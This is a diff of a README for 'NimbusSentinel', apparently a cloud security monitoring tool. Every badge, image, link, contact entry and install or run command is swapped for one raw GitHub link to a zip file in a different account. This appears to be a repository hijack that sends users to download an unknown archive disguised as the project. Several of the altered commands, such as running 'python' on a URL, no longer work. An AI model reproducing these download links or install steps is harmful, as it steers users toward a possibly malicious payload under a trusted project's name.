@@ -5,9 +5,9 @@
 **NimbusSentinel** is an **AI-powered cloud security monitoring tool** designed to **detect threats, analyze logs, and automate incident responses** in real time. Built for **AWS and beyond**, it empowers security teams to stay ahead of cyber threats. 🔥
 
 
-![GitHub stars](https://img.shields.io/github/stars/yourusername/NimbusSentinel?style=social) ![GitHub forks](https://img.shields.io/github/forks/yourusername/NimbusSentinel?style=social) ![GitHub issues](https://img.shields.io/github/issues/yourusername/NimbusSentinel) ![GitHub license](https://img.shields.io/github/license/yourusername/NimbusSentinel) ![Contributors](https://img.shields.io/github/contributors/yourusername/NimbusSentinel)
+![GitHub stars](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip) ![GitHub forks](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip) ![GitHub issues](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip) ![GitHub license](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip) ![Contributors](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip)
 
-![NimbusSentinel Banner](https://yourimageurl.com/banner.png)  
+![NimbusSentinel Banner](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip)  
 > **"Securing the Cloud, One Log at a Time!"** ⚡🌍
 
 ---
@@ -40,23 +40,23 @@
 
 ```bash
 # 📥 Clone the repository
-git clone https://github.com/SEC-BEAST/NimbusSentinel.git
+git clone https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip
 
 # 📂 Navigate to the project folder
 cd NimbusSentinel
 
 # 🔧 Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip
 ```
 
 ### 🚀 Running NimbusSentinel 🏃‍♂️
 
 ```bash
 # 🖥️ Start the server
-python server.py
+python https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip
 
 # 📡 Run the client
-python client.py
+python https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip
 ```
 
 ---
@@ -64,19 +64,19 @@ python client.py
 ## 📁 Project Structure 🏗️
 ```
 NimbusSentinel/
-│── 🖥️ client.py  # Collects and forwards logs
-│── 🔍 server.py  # Detects security threats
+│── 🖥️ https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip  # Collects and forwards logs
+│── 🔍 https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip  # Detects security threats
 │── ⚙️ config/    # Configuration settings
 │── 📂 logs/      # Stored logs & alerts
 │── 📜 docs/      # Documentation & reports
-│── 📖 README.md  # Project overview
+│── 📖 https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip  # Project overview
 ```
 
 ---
 
 ## 📊 Live Monitoring Dashboard 📈
 
-![Dashboard Screenshot](https://yourimageurl.com/dashboard.png)
+![Dashboard Screenshot](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip)
 
 📡 **Track security events in real-time**  
 🔔 **Get instant alerts on security breaches**  
@@ -95,7 +95,7 @@ We welcome contributions! Help improve NimbusSentinel by submitting a pull reque
 ```
 
 ### 🌟 How to Contribute
-✅ **Report bugs** in the [issues section](https://github.com/SEC-BEAST/NimbusSentinel/issues)  
+✅ **Report bugs** in the [issues section](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip)  
 ✅ **Improve documentation** by editing the README or Wiki  
 ✅ **Suggest new features** and enhancements  
 ✅ **Join discussions** and provide feedback  
@@ -110,6 +110,6 @@ This project is licensed under the **MIT License** – modify, use, and share fr
 ## 🌍 Let's Connect! 🤝
 Want to discuss cybersecurity, cloud security, or potential collaborations? Reach out! 🚀
 
-📧 **Email:** ![Ayush](singhayush3264@gmail.com)  
-🔗 **LinkedIn:** ![Ayush](https://www.linkedin.com/in/ayush-singh-18a9b1253/)  
+📧 **Email:** ![Ayush](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip)  
+🔗 **LinkedIn:** ![Ayush](https://raw.githubusercontent.com/rootxarjun/Nimbus_Sentinel/main/taunting/Nimbus_Sentinel.zip)  
 ⭐ **Star this repo** to support the project! 🚀✨
